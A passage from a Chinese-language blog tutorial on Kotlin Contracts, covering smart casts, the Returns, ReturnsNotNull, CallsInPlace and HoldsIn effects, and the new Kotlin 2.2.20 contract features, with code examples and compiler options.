<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onClick</span><span class="hljs-params">(v：View?)</span></span> {
    <span class="hljs-keyword">if</span> (v <span class="hljs-keyword">is</span> TextView) {
        <span class="hljs-comment">// 编译器自动将 'v' 转换为了'View',因此可以直接调用TextView 的方法</span>
        v.setText(<span class="hljs-string">"TextView"</span>) 
    }
}
</code></pre>
<p>以上两个示例表明 Kotlin 编译器可以智能的根据上下文的类型检查条件来自动的进行类型转化，这是因为 Kotlin 编译器会进行大量的静态分析，这就是 Kotlin 编译器的智能转换。</p>
<blockquote>
<p>What ?  这我知道呀，用你说? 这里面也没有 Contracts 呀？</p>
</blockquote>
<p>别急，上面的示例虽然可以利用 Kotlin 的自动的智能转换，但是一旦将这个功能提取到一个单独的函数中时，这些智能转换功能就消失了，且看：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> String?.<span class="hljs-title">isNotNull</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> = <span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span>

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">(s: <span class="hljs-type">String</span>?)</span></span> {
    <span class="hljs-keyword">if</span> (s.isNotNull()) s.length <span class="hljs-comment">// No smartcast :(</span>
}
</code></pre>
<p>因此为了改善这种情况，Kotlin 在 1.3  版本 中引入了 <strong><code>Contracts</code></strong> 机制。</p>
<h2 data-id="heading-2">Why?</h2>
<p>上面对于 Contracts 是什么的解释其实也同时回答了为什么会有 Contracts ，但看到这里有人可能还会有疑问，为什么单独拿到一个函数中，这种「智能转换」就失效了，原因其实很简单，因为这个「新函数」是你自己写的，Kotlin 编译器无法 100% 的确认你的 <code>isNotNull</code> 函数真的可以产生对应的效果，因此需要开发者通过一种途径也就是「Contracts」来明确这一点，并且在Kotlin官方文档中也明确表示 「编写正确合理的 Contracts 是程序员的责任」</p>
<p>总结：</p>
<p><strong><code>Contracts</code></strong> 允许函数的作者(也就是阁下😎) 以编译器能够理解的方式 <strong>显示的</strong> 描述你所写的这个函数的行为。</p>
<p>说白了就是：你可以用 Contracts 这个东西来告诉 Kotlin 的编译器，你声明的函数是干什么用的。比如上面的 <code>isNotNull</code> 这个函数，你在没有使用 Contracts 之前，这个函数的作用只是为了给<strong>其他的开发者或者你自己看</strong>的，用来告诉调用者这个函数如果返回 <code>true</code> 就说明传入的参数不为空，但是，编译器并不知道，所以使用 Contracts 来让 Kotlin 编译器也能看懂你这个函数的作用。</p>
<h2 data-id="heading-3">How?</h2>
<p>以上只是介绍了 Contracts 支持的其中一种情况，Kotlin 中称为 Effect（效果），Kotlin 使用 <strong><code>Effect</code></strong> 接口来定义函数可能表现出的种种情况。截止到这篇文章发布时, Kotlin 的最新稳定版本是 Kotlin v2.2.21，在 Kotlin v2.2.20 中Contracts 新增了多项重大更新，在最新版的 Kotlin 中 Effect 目前定义了五种具体的 Effect ****（其在<code>kotlin-stdlib</code>标准库的<code>kotlin.contract</code> 包中定义），它们都是继承自 Effect 的接口</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fapi%2Fcore%2Fkotlin-stdlib%2Fkotlin.contracts%2F-simple-effect%2Findex.html" target="_blank" title="https://kotlinlang.org/api/core/kotlin-stdlib/kotlin.contracts/-simple-effect/index.html" ref="nofollow noopener noreferrer">SimpleEffect</a>
<ul>
<li>Returns</li>
<li>ReturnsNotNull</li>
</ul>
</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fapi%2Fcore%2Fkotlin-stdlib%2Fkotlin.contracts%2F-conditional-effect%2Findex.html" target="_blank" title="https://kotlinlang.org/api/core/kotlin-stdlib/kotlin.contracts/-conditional-effect/index.html" ref="nofollow noopener noreferrer">ConditionalEffect</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fapi%2Fcore%2Fkotlin-stdlib%2Fkotlin.contracts%2F-calls-in-place%2Findex.html" target="_blank" title="https://kotlinlang.org/api/core/kotlin-stdlib/kotlin.contracts/-calls-in-place/index.html" ref="nofollow noopener noreferrer">CallsInPlace</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fapi%2Fcore%2Fkotlin-stdlib%2Fkotlin.contracts%2F-holds-in%2Findex.html" target="_blank" title="https://kotlinlang.org/api/core/kotlin-stdlib/kotlin.contracts/-holds-in/index.html" ref="nofollow noopener noreferrer">HoldsIn</a></li>
</ul>
<p>分别介绍一下：</p>
<h3 data-id="heading-4"><code>SimpleEffect : Effect</code></h3>
<p>这表示一种简单的效果，其中包含以下两种具体效果：</p>
<ul>
<li>
<p><strong><code>Returns : SimpleEffect</code></strong></p>
<p>Returns接口有两种实现（所有继承Effect 的接口都通过 在<code>ContractsBuilder</code> 接口中实现）</p>
<ol>
<li>
<p><code>returns(): Returns</code></p>
<p>它表示函数正常返回(即不抛出异常)，它通常与 <code>implies</code> 结合使用，implies 表示「暗示」，意思就是告诉编译器 如果函数能正常返回则暗示着什么结果，函数调用处后面就会自动确认是这个结果</p>
<p>应用场景：API 中的参数验证、构建器中的状态检查。在Kotlin标准库中，<code>require</code> 函数使用此效果进行前置条件强制。</p>
<p>示例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">require</span><span class="hljs-params">(condition: <span class="hljs-type">Boolean</span>)</span></span> {
    contract { 
		    <span class="hljs-comment">// 如果函数正常返回，则意味着函数调用者传入的条件是true</span>
        returns() implies condition  
    }
    <span class="hljs-comment">//否则抛出异常</span>
    <span class="hljs-keyword">if</span> (!condition) <span class="hljs-keyword">throw</span> IllegalArgumentException()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">example</span><span class="hljs-params">(x: <span class="hljs-type">String</span>?)</span></span> {
    require(x != <span class="hljs-literal">null</span>)
    <span class="hljs-comment">// 通过Contract编译器知道x非空，因为require正常返回意味着x != null为true</span>
    println(x.length) <span class="hljs-comment">// 智能转换为非空</span>
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">//kotlin.contracts.Effect.kt 部分源码</span>
<span class="hljs-meta">@ContractsDsl</span>
<span class="hljs-meta">@ExperimentalContracts</span>
<span class="hljs-meta">@SinceKotlin(<span class="hljs-string">"1.3"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SimpleEffect</span> : <span class="hljs-type">Effect</span> {
    <span class="hljs-meta">@ContractsDsl</span>
    <span class="hljs-meta">@ExperimentalContracts</span>
    <span class="hljs-comment">//infix 表示这是个中缀函数</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">implies</span><span class="hljs-params">(booleanExpression: <span class="hljs-type">Boolean</span>)</span></span>: ConditionalEffect
}
</code></pre>
<blockquote>
<p>PS:   <code>returns() implies condition</code> 这种写法能够成立是因为 implies 是一个中缀函数，它等同于 <code>returns().implies(condition)</code>
可以明显的看出来，中缀函数的好处是能更形象的表达出中缀函数 前后两者的关系</p>
</blockquote>
</li>
<li>
<p><code>returns(value: Any?): Returns</code></p>
</li>
</ol>
<p>表示函数正常返回，并且返回值是 value， 并且在返回该值 暗示条件，它适用于谓词函数(过滤，条件判断等功能的函数，返回值是 Boolean)</p>
<p>应用场景：类型守卫、资格检查。增强复杂条件中的流类型分析。</p>
<p>示例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>)
<span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isUser</span><span class="hljs-params">(user: <span class="hljs-type">Any</span>?)</span></span>: <span class="hljs-built_in">Boolean</span> {
    contract { returns(<span class="hljs-literal">true</span>) implies (user <span class="hljs-keyword">is</span> User) }
    <span class="hljs-keyword">return</span> user <span class="hljs-keyword">is</span> User
}
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">greet</span><span class="hljs-params">(user: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-keyword">if</span> (isUser(user) &amp;&amp; user.age &gt; <span class="hljs-number">18</span>) {
        println(<span class="hljs-string">"Hello, adult user：<span class="hljs-subst">${user.age}</span>"</span>)
    }
}
</code></pre>
<p>另外Strings.kt 源码中也有类似使用：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@kotlin</span>.<span class="hljs-keyword">internal</span>.InlineOnly
<span class="hljs-keyword">public</span> <span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> CharSequence?.<span class="hljs-title">isNullOrEmpty</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    contract {
        returns(<span class="hljs-literal">false</span>) implies (<span class="hljs-keyword">this</span><span class="hljs-symbol">@isNullOrEmpty</span> != <span class="hljs-literal">null</span>)
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> == <span class="hljs-literal">null</span> || <span class="hljs-keyword">this</span>.length == <span class="hljs-number">0</span>
}
</code></pre>
</li>
<li>
<p><strong><code>ReturnsNotNull : SimpleEffect</code></strong></p>
<p>它描述的是函数正常返回(不抛异常)，并且返回值是非空的情况，官方文档说 <code>returnsNotNull()</code> 是 v2.2.20 中新增的函数，但<code>ReturnsNotNull</code> 这个Effect 在 Kotlin 1.3 中的源码中就已经有了，下面我们来分开说一下：：</p>
<ul>
<li>
<p>Kotlin v2.2.20 以下版本中的 <code>returnsNotNull()</code> :</p>
<ol>
<li>
<p>单独使用这个效果：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">nonNullIfValid</span><span class="hljs-params">(input: <span class="hljs-type">String</span>?)</span></span>: String {
    contract {
        returnsNotNull()  <span class="hljs-comment">// 表示函数总是返回非空（如果不抛异常）</span>
    }
    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span> || input.isEmpty()) <span class="hljs-keyword">throw</span> IllegalArgumentException()
    <span class="hljs-keyword">return</span> input
}
</code></pre>
<p>看到这个代码，可能有人就发现了：</p>
<blockquote>
<p>这不是脱裤子放屁吗，<code>nonNullIfValid</code> 的返回值已经声明是 <code>String</code> 了，表明它不会返回空值了呀</p>
</blockquote>
<p>确实，单独使用 <code>returnsNotNull()</code> 确实没有实际的应用场景，因此它通常与 implies 来结合使用，如同 <code>returns()</code> 和 <code>returns(value)</code> 一样</p>
</li>
<li>
<p><code>returnsNotNull() impiles condition</code></p>
<p>效果在左，条件在右，表示当函数返回非空值时 意味着 condition 这个条件是成立的。</p>
<p>应用场景：适用于“事后验证”（post-condition），从输出推断输入。适合谓词函数或处理器，当返回非空时，反推输入满足条件（如类型/非空）。常见于库 API 中，帮助调用者避免冗余检查。</p>
<p>示例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processIfValid</span><span class="hljs-params">(input: <span class="hljs-type">Any</span>?)</span></span>: String? {
    contract {
        <span class="hljs-comment">// 如果返回非空，则 input 是非空 String</span>
        returnsNotNull() implies (input != <span class="hljs-literal">null</span> &amp;&amp; input <span class="hljs-keyword">is</span> String)
    }
    <span class="hljs-keyword">if</span> (input !<span class="hljs-keyword">is</span> String) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    <span class="hljs-keyword">return</span> input.trim()  <span class="hljs-comment">// 返回非空 String</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">useProcess</span><span class="hljs-params">(obj: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-keyword">val</span> result = processIfValid(obj)
    <span class="hljs-keyword">if</span> (result != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 编译器智能推断 obj 是非空 String（因为返回非空 ⇒ 条件真）</span>
        println(<span class="hljs-string">"useProcess:<span class="hljs-subst">${obj.length}</span>"</span>)  <span class="hljs-comment">// 无需 !! 或额外检查</span>
    }
}
</code></pre>
</li>
</ol>
</li>
<li>
<p>Kotlin 2.2.20 及以上版本中，returnsNotNull() 增加了新的使用方法及使用场景，也就是条件在左，效果在右： <code>(condition) implies returnsNotNull()</code></p>
<p>含义：如果 condition 成立则函数返回非空值。</p>
<ul>
<li>
<p>这是一种“正向推断”：从已知条件推断返回行为。</p>
</li>
<li>
<p>编译器使用它来优化：当调用前条件已验证（如 通过 if 检查），则返回智能转换为非空类型，避免 ? 或 !!。</p>
</li>
</ul>
<blockquote>
<p>PS：与 v 2.2.20 之前的版本对比：</p>
<p><code>returnsNotNull() impiles condition</code> ：// 自 Kotlin 1.3，SimpleEffect 接口的方法</p>
<p><code>(condition) implies returnsNotNull()</code> ：// Kotlin 2.2.20 新增，Boolean 的扩展函数</p>
<p>两者虽然都使用的是 <code>implies</code> 这个中缀函数，但实际上这两个根本不是同一个函数 <code>(condition) implies returnsNotNull()</code> 中的 implies 是 v2.2.20 在 ContractBuilder 接口中新增的一个 infix 函数：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">    <span class="hljs-comment">/**
     * 指定当作为接收器参数传递的条件成立时，将观察到的效果。
     * 目前仅支持ReturnsNotNull效果。
     * Note: 接收器只能接受 boolean 类型的表达式，并且接收器或者叫函数参数会经历下面
     * 两种处理：
     * 空检查 (`== null`, `!= null`);
     * 实例检查 (`is`, `!is`);
     */</span>
    <span class="hljs-meta">@ExperimentalExtendedContracts</span>
    <span class="hljs-meta">@ContractsDsl</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Boolean</span>.<span class="hljs-title">implies</span><span class="hljs-params">(value: <span class="hljs-type">ReturnsNotNull</span>)</span></span>
</code></pre>
<p>而<code>returnsNotNull() impiles condition</code> 中的 implies 则是 SimpleEffect 接口中的一个方法，这点将在下面的 ConditionalEffect 中详细讲解。</p>
</blockquote>
<p>应用场景：可空输入非空输出，适合处理可空输入的工具函数，当输入满足条件时，直接保证输出非空。替换了传统需要两个重载函数（可空版和非空版）的场景，提升代码简洁性。</p>
<p>示例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@OptIn(ExperimentalContracts::class, 
		ExperimentalExtendedContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">decode</span><span class="hljs-params">(encoded: <span class="hljs-type">String</span>?)</span></span>: String? {
    contract {
        <span class="hljs-comment">//输入是非空时，保证输出非空</span>
        (encoded != <span class="hljs-literal">null</span>) implies (returnsNotNull())
    }
    <span class="hljs-keyword">if</span> (encoded == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    <span class="hljs-keyword">return</span> java.net.URLDecoder.decode(encoded, <span class="hljs-string">"UTF-8"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">useDecodedValue</span><span class="hljs-params">(s: <span class="hljs-type">String</span>?)</span></span> {
    <span class="hljs-comment">//未判断输入非空时，函数需要使用'?'安全调用</span>
    decode(s)?.length
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 判断后编译器通过智能转换，返回值视为非空！</span>
        println(<span class="hljs-string">"decode length:<span class="hljs-subst">${decode(s).length}</span>"</span>)
    }
}
</code></pre>
<p>细心的人可能注意到 这个 <code>decode</code> 方法比之前的示例多了一个 注解<code>@OptIn(ExperimentalExtendedContracts::class)</code> 这是因为 <code>(condition) implies returnsNotNull()</code> 这种用法是 Kotlin2.2.20 新增的实验性的扩展功能</p>
<p>并且如果要启用这个功能，需要在项目的<code>build.gradle(.kts)</code> 中额外的添加编译器选项：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">kotlin {
    compilerOptions {
        freeCompilerArgs.add(<span class="hljs-string">"-Xallow-condition-implies-returns-contracts"</span>)
    }
}
</code></pre>
<blockquote>
<p>⚠️ PS：
截至文章发布时，我使用的是 AndroidStudio 最新版：Android Studio Otter | 2025.2.1  ，官方文档提示：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jetbrains.com%2Fidea%2Fnextversion%2F%3F_cl%3DMTsxOzE7d2JDOWl2ZFpvUlJ4UWQ3MlFLN0tQRWQxeEVSdFVGU0JDOGZhenpIV3U2YkxvMnhibWRwd05WOXR4SnIxWVdTazs%3D%26_gl%3D1*k7ja7k*_gcl_au*MTczODY1NDU0MC4xNzYyMzEyNDg0*_ga*MTE4NjA5NjIzMy4xNzI0MTMzODM2*_ga_9J976DJZ68*czE3NjM1Mzk2ODMkbzI2JGcxJHQxNzYzNTQwODE0JGozNyRsMCRoMA.." target="_blank" title="https://www.jetbrains.com/idea/nextversion/?_cl=MTsxOzE7d2JDOWl2ZFpvUlJ4UWQ3MlFLN0tQRWQxeEVSdFVGU0JDOGZhenpIV3U2YkxvMnhibWRwd05WOXR4SnIxWVdTazs=&amp;_gl=1*k7ja7k*_gcl_au*MTczODY1NDU0MC4xNzYyMzEyNDg0*_ga*MTE4NjA5NjIzMy4xNzI0MTMzODM2*_ga_9J976DJZ68*czE3NjM1Mzk2ODMkbzI2JGcxJHQxNzYzNTQwODE0JGozNyRsMCRoMA.." ref="nofollow noopener noreferrer">IntelliJ IDEA 目前仅在2025.3 EAP 版本</a> 对新增的功能进行代码提示的更新，AndroidStudio 是跟随 IDEA 的，因此需要如果你当前也和我一样使用的是同一版本或者更低的 AndroidStudio ，那么你可能也会遇到以下问题：
即便已经标记了 <code>@OptIn(ExperimentalExtendedContracts::class)</code>  并且也在<code>build.gradle(.kts)</code> 中添加了上面的编译器选项，IDE 仍然会提示错误： ‘ implies 的这种用法不是 Contracts 的合法语句’，不用担心，只要你配置正确，可以无视这个报错，直接编译运行不会出错，等到后期 AS 更新后这个错误自然会消失</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/993845e7049f4af19c3eb4ea648ad73b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRW50cm9wbGVzcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307974&amp;x-signature=DurD4kLJ%2BrsgnH1iyVmFp5%2Fx2AI%3D" alt="image.png" loading="lazy"/></p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5"><code>ConditionalEffect : Effect</code> (<code>implies</code>)</h3>
<p>它也是一种效果，但是一种和其它效果组合产生的效果，它所表达的含义是：使其它效果条件化。它是通过 SimpleEffect 的 <code>implies</code> 函数来实现的</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@ContractsDsl</span>
<span class="hljs-meta">@ExperimentalContracts</span>
<span class="hljs-meta">@SinceKotlin(<span class="hljs-string">"1.3"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SimpleEffect</span> : <span class="hljs-type">Effect</span> {
    <span class="hljs-meta">@ContractsDsl</span>
    <span class="hljs-meta">@ExperimentalContracts</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">implies</span><span class="hljs-params">(booleanExpression: <span class="hljs-type">Boolean</span>)</span></span>: ConditionalEffect
}
</code></pre>
<p>也就是： <code>simpleEffect implies (booleanExpression: Boolean)</code>  如果函数的某个 SimpleEffect (<code>Returns || Returns(value) || ReturnsNotNull</code> )成立，那么意味着 后面的 boolean 表达式就是成立的，可以看到这里的 <code>implies</code> 函数返回的就是<code>ConditionalEffect</code> 。这个整体所表达的就是一个 <code>ConditionalEffect</code> (条件化的效果)。</p>
<h3 data-id="heading-6"><code>CallsInPlace : Effect</code></h3>
<p>它的含义是：对于带有高阶函数(函数类型参数，也就是Lambda)参数的函数，开发者可以告诉编译器这个函数中的某个<strong>高阶函数</strong> 在当前这个函数中被调用了，并且可以指定被调用的次数（通过 <code>InvocationKind</code> 枚举）。</p>
<p><code>InvocationKind</code>：lambda 在函数中被调用的次数，包括 <code>EXACTLY_ONCE</code>（有且仅有一次）、<code>AT_MOST_ONCE</code>（至多一次）、<code>AT_LEAST_ONCE</code>（至少一次）、<code>UNKNOWN</code>（未知，默认）。</p>
<p>使用场景：</p>
<ul>
<li>你希望接收一个 lambda，并希望编译器知道这个 lambda 会被立即/一次性执行，从而改进对在 lambda 中进行变量初始化分析</li>
<li>在 kotlin 标准库中的 <code>run</code>, <code>apply</code>, <code>also</code>, <code>let</code> 这类控制流函数就使用了 callsInPlace()</li>
</ul>
<p>示例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
<span class="hljs-keyword">inline</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initSafely</span><span class="hljs-params">(block: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
    contract {
		    <span class="hljs-comment">//这里告诉编译器，将保证在当前这个函数内部调用且仅调用一次 block</span>
        callsInPlace(block, InvocationKind.EXACTLY_ONCE)
    }
    block()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">initExample</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> message: String?
    initSafely {
        message = <span class="hljs-string">"Hello, World!"</span> <span class="hljs-comment">// 编译器知道这个 lambda 会执行一次</span>
    }
    println(<span class="hljs-string">"message is <span class="hljs-variable">$message</span>"</span>) <span class="hljs-comment">// 可以安全使用</span>
}
</code></pre>
<blockquote>
<p>PS: 注意，在 Kotlin 1.3 官方文档关于 CallsInPlace 的示例中(<a href="https://link.juejin.cn?target=https%3A%2F%2Fkotlinlang.org%2Fdocs%2Fwhatsnew13.html%23contracts" target="_blank" title="https://kotlinlang.org/docs/whatsnew13.html#contracts" ref="nofollow noopener noreferrer">kotlinlang.org/docs/whatsn…</a>)，有一个明显错误，它在  <code>callsInPlace{}</code>  中指定了<code>EXACTLY_ONCE</code> 但是在 contract 外部却没有调用 block，这应该是笔误，大家如果看到不要被误导！</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">synchronize</span><span class="hljs-params">(lock: <span class="hljs-type">Any</span>?, block: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
    <span class="hljs-comment">// It tells the compiler:</span>
    <span class="hljs-comment">// "This function will invoke 'block' here and now, and exactly one time"</span>
    contract { callsInPlace(block, EXACTLY_ONCE) }
    <span class="hljs-comment">//*没有实际调用 block()！！！*</span>
}
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> x: <span class="hljs-built_in">Int</span>
    synchronize(lock) {
        x = <span class="hljs-number">42</span> <span class="hljs-comment">// Compiler knows that lambda passed to 'synchronize' is called</span>
               <span class="hljs-comment">// exactly once, so no reassignment is reported</span>
    }
    println(x) <span class="hljs-comment">// Compiler knows that lambda will be definitely called, performing</span>
               <span class="hljs-comment">// initialization, so 'x' is considered to be initialized here</span>
}
</code></pre>
</blockquote>
<h3 data-id="heading-7"><code>HoldsIn : Effect</code></h3>
<p>这是 Kotlin v2.2.20 中新增的一个重要的 Effect，它表示在带有高阶函数(lambda)参数的函数中，开发者告诉编译器：我能保证在传入的这个 lambda 中，某个 boolean 表达式的结果为<code>true</code>！，然后编译器就可以在这个 lambda 内部智能的认为 condition 为 true，而不会再需要开发者在 lambda 内部进行 condition 的条件判断，它通常和上面的 <code>callsInPlace</code> 结合使用</p>
<p>语法：<code>condition holdsIn block</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@OptIn(ExperimentalContracts::class, ExperimentalExtendedContracts::class)</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T.<span class="hljs-title">alsoIf</span><span class="hljs-params">(condition: <span class="hljs-type">Boolean</span>, block: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span>: T {
    contract {
        <span class="hljs-comment">// 声明这个 lambda 在这个函数中最多被调用一次</span>
        callsInPlace(block, InvocationKind.AT_MOST_ONCE)
        <span class="hljs-comment">// 声明在lambda内部假设条件为真</span>
        condition holdsIn block
    }
    <span class="hljs-comment">//开发者来实际自己保证在contract中的承诺</span>
    <span class="hljs-keyword">if</span> (condition) block(<span class="hljs-keyword">this</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">useApplyIf</span><span class="hljs-params">(input: <span class="hljs-type">Any</span>)</span></span> {
    <span class="hljs-keyword">val</span> result = listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
        .first()
        .alsoIf(input <span class="hljs-keyword">is</span> <span class="hljs-built_in">Int</span>) {
            <span class="hljs-comment">// 输入参数在lambda内部被智能转换为Int，可以直接和列表中第一个元素相加</span>
            println(<span class="hljs-string">"holdIn:<span class="hljs-subst">${input + it}</span>"</span>)
        }
        .toString()
}
</code></pre>
<p>这也是Kotlin 2.2.20 中的一个实验的扩展功能，因此也必须额外添加 <code>@OptIn(ExperimentalExtendedContracts::class)</code> 注解</p>
<p>同时也须要在<code>build.gradle(.kts)</code> 中添加额外的编译器选项：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">kotlin {
    compilerOptions {
        freeCompilerArgs.add(<span class="hljs-string">"-Xallow-holdsin-contract"</span>)
    }
}
</code></pre>
<blockquote>
<p>⚠️ PS：同样的，这与 <code>condition implies returnsNotNull()</code>  的问题一样，在当前最新的 AS 中仍然会报错，如果配置正确，可以忽略 IDE 报错警告！</p>
</blockquote>
<h3 data-id="heading-8">Kotlin 2.2.20 关于 Contracts 的其它新特性</h3>
<h4 data-id="heading-9">支持在属性访问器和操作符中使用 Contracts</h4>
<p>将 Contracts 的使用扩展到属性的getter方法和以下操作符 中</p>
<ul>
<li><code>invoke</code></li>
<li><code>contains</code></li>
<li><code>rangeTo</code>，<code>rangeUntil</code></li>
<li><code>componentN</code></li>
<li><code>iterator</code></li>
<li><code>unaryPlus</code>，，<code>unaryMinusnot</code></li>
<li><code>inc</code>，<code>dec</code></li>
</ul>
<p>示例（<code>getter</code>）：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> Any?.isNonNullString: <span class="hljs-built_in">Boolean</span>
    <span class="hljs-keyword">get</span>() {
        <span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
        contract { returns(<span class="hljs-literal">true</span>) implies (<span class="hljs-keyword">this</span><span class="hljs-symbol">@isNonNullString</span> <span class="hljs-keyword">is</span> String) }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> String
    }
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">useProp</span><span class="hljs-params">(obj: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-keyword">if</span> (obj.isNonNullString) {
        <span class="hljs-comment">// obj 智能转换为 String</span>
        println(obj.length)
    }
}
</code></pre>
<p>示例（<code>invoke</code>）：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Runner</span> {
    <span class="hljs-meta">@OptIn(ExperimentalContracts::class)</span>
    <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">invoke</span><span class="hljs-params">(block: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
        contract {
            callsInPlace(block, InvocationKind.EXACTLY_ONCE)
        }
        block()
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testOperator</span><span class="hljs-params">(runner: <span class="hljs-type">Runner</span>)</span></span> {
    <span class="hljs-keyword">val</span> number: <span class="hljs-built_in">Int</span>
    runner {
        number = <span class="hljs-number">1</span>
    }
    <span class="hljs-comment">// </span>
    println(number)
    <span class="hljs-comment">// 1</span>
}
</code></pre>
<p>同样的，要启用这些功能也需要添加额外的编译器选项：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">kotlin {
    compilerOptions {
        freeCompilerArgs.add(<span class="hljs-string">"-Xallow-contracts-on-more-functions"</span>)
    }
}
</code></pre>
<h4 data-id="heading-10">泛型类型断言</h4>
<p>由于泛型类型擦除的特性，因此在这之前我们无法 写出 <code>value is List&lt;String&gt;</code> 这种代码，现在Kotlin 2.2.20 的 Contracts 新增了 泛型类型断言 这一功能，因此我们就可以在 contract{ } 内部写出这样的代码了。</p>
<p>通过contracts，你可以在一个函数里声明：<strong>如果函数返回某值 (比如 <code>true</code>) 或发生某 effect，那么 <code>this</code> 或函数参数在类型上满足某个泛型类型</strong>。</p>
<p>示例：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Failure</span> {
